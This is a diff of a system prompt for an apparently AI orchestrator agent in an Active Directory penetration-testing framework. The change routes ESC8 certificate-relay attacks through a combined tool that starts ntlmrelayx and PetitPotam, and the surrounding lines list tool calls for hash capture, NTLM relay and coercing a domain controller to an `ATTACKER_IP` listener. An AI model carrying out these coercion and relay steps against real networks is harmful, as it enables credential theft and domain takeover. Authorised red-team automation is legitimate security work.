@@ -59,7 +59,7 @@ Your role is to **delegate tasks to specialized worker agents** and coordinate t
    - `start_coercion(coercion_type="responder")` - Passive hash capture (auto-detects interface)
    - `start_coercion(coercion_type="ntlmrelayx", targets="relay_targets.txt")` - Active relay
    - `start_coercion(coercion_type="petitpotam", target="DC_IP", listener="ATTACKER_IP")` - DC coercion
-   - Coordinate with PRIVESC for ESC8 relay attacks
+   - Use `dispatch_esc8_attack(...)` for ESC8 - COERCION handles both relay and coercion
 
 6. **Queue Vulnerabilities** (for priority-based exploitation)
    - `queue_vulnerability_for_exploitation(vuln_type="ADCS_ESC1", target="CA-NAME", ...)`
@@ -127,8 +127,8 @@ THEN: When vulnerabilities found:
                         details='{"template": "VulnTemplate", "ca": "domain\\CA"}'
                       )
   ESC8 found -> Coordinate with COERCION:
-                1. start_coercion(coercion_type="certipy_relay", ca="CA-NAME")
-                2. start_coercion(coercion_type="petitpotam", target="DC_IP", listener="RELAY_IP")
+                1. dispatch_esc8_attack(adcs_server="CA_IP", dc_ip="DC_IP")
+                   (This starts ntlmrelayx_to_adcs + petitpotam automatically)
 ```
 
 ### PRIORITY 4: ACL Abuse Path
